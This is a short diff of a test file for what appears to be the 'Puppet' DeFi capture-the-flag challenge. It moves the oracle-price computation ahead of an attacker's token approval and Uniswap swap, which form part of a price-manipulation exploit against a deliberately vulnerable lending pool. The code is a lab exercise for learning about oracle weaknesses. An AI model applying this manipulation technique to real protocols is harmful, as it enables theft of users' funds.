@@ -103,6 +103,11 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        let uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
+        let computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
+        console.log(`Computed Oracle Price before swap: ${ethers.utils.formatEther(computedPrice)}`)
+
         let smallAmount = ethers.utils.parseEther("999");
 
         await this.token.connect(attacker).approve(
@@ -110,11 +115,6 @@ describe('[Challenge] Puppet', function () {
             smallAmount
         );
         
-        let uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
-        let uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
-        let computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
-        console.log(`Computed Oracle Price before swap: ${ethers.utils.formatEther(computedPrice)}`)
-
         await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
             smallAmount,                                                // tokens sold
             1,                                                          // min_eth
